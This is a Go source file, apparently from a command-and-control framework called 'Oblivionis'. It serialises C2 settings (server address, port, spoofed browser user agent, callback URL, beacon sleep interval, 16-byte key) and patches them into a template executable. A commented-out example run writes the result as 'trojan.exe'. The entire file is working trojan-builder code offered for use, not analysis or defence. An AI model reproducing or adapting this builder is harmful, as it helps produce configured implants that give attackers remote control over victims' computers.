package main

import (
	"bytes"
	"io/ioutil"
	"strconv"
)

type OblivionisConfig struct {
	c2addr    string
	c2port    uint16
	useragent string
	url       string
	host      string
	sleep     uint32
	a         []uint8
}

/*
	Config 格式:

|c2addr|c2port|useragent|url|host|sleep|16 bytes A
*/
func (self OblivionisConfig) toData() []uint8 {
	var buffer bytes.Buffer
	buffer.WriteString("|" + self.c2addr + "|")
	c2portStr := strconv.Itoa(int(self.c2port))
	buffer.WriteString(c2portStr + "|")
	buffer.WriteString(self.useragent + "|")
	buffer.WriteString(self.url + "|")
	buffer.WriteString(self.host + "|")
	sleepStr := strconv.Itoa(int(self.sleep))
	buffer.WriteString(sleepStr + "|")
	buffer.Write(self.a)
	return buffer.Bytes()
}

func GenerateOblivionis(config OblivionisConfig, path string) {
	configData := config.toData()
	blank, _ := ioutil.ReadFile("./blank.exe")
	target := []byte("abcdefgh")
	idx := bytes.Index(blank, target)
	copy(blank[idx:], configData)
	ioutil.WriteFile(path, blank, 0644)
}

/*
func hexDump(arr []uint8) {
	i := 0
	for i < len(arr) {
		if i%16 == 0 && i != 0 {
			fmt.Print("        ")
			j := 0
			for j < 16 {
				fmt.Printf("%c", arr[i-16+j])
				j += 1
			}

			fmt.Println("")
		}
		fmt.Printf("%02x ", arr[i])
		i += 1
	}
}


func main() {
	encrypt_a := make([]uint8, 16)
	i := 0
	for i < 16 {
		encrypt_a[i] = (uint8)(41 + i*2)
		i += 1
	}
	cfg := OblivionisConfig{
		c2addr:    "127.0.0.1",
		c2port:    8080,
		useragent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
		url:       "admin.php",
		host:      "localhost",
		sleep:     500,
		a:         encrypt_a,
	}
	fmt.Println("key = ")
	hexDump(encrypt_a)
	fmt.Println("\nconfig data = ")
	configData := cfg.toData()
	hexDump(configData)
	GenerateOblivionis(cfg, "trojan.exe")
}
*/
